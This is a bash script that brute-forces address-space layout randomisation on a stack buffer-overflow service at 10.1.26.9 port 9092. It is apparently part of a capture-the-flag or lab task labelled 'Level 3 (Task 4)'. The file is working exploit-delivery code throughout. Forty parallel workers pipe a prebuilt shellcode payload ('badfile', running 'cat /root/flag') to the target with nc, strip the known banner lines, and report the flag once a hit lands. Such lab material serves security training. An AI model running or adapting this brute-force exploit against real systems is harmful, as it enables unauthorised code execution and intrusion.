#!/bin/bash
# Parallel ASLR brute force for the Level 3 (Task 4) target on :9092.
#
# Why parallel: a serial loop sends one payload then waits for the network
# round-trip before the next, so it is capped at roughly 1/RTT tries per second.
# Running many workers at once overlaps those waits and finds the hit far faster
# on a real network.
#
# Build `badfile` first with exploit.py (shellcode = `cat /root/flag`, and a
# `ret` chosen from THIS target's own probed addresses). Then:
#
#   ./brute-force.sh              # defaults to 10.1.26.9 9092
#   ./brute-force.sh HOST PORT    # override target (e.g. for testing)
#   WORKERS=60 ./brute-force.sh   # change the number of parallel workers

TARGET=${1:-10.1.26.9}
PORT=${2:-9092}
WORKERS=${WORKERS:-40}

FLAGFILE="$(mktemp)"
SECONDS=0
cleanup() { pkill -P $$ 2>/dev/null; rm -f "$FLAGFILE"; }
trap cleanup EXIT

worker() {
  while [ ! -s "$FLAGFILE" ]; do
    out=$(cat badfile | nc -q 0 -w 2 "$TARGET" "$PORT" 2>/dev/null)
    # A miss ends in "Returned Properly" (or crashes silently). A hit runs
    # `cat /root/flag` and never returns -> strip every known banner line and
    # whatever text is left is the flag.
    flag=$(printf '%s\n' "$out" | grep -avE \
      'Starting stack|Input size|Frame Pointer|Buffer.?s address|Returned Properly|Got a connection|^[[:space:]]*$')
    if [ -n "$flag" ]; then
      printf '%s\n' "$flag" > "$FLAGFILE"
      return
    fi
  done
}

echo "Brute forcing $TARGET:$PORT with $WORKERS parallel workers (Ctrl-C to stop)..."
for _ in $(seq "$WORKERS"); do worker & done

while [ ! -s "$FLAGFILE" ]; do
  sleep 5
  [ -s "$FLAGFILE" ] && break
  echo "  ...still trying, ${SECONDS}s elapsed"
done

echo "=== HIT after ${SECONDS} seconds ==="
cat "$FLAGFILE"
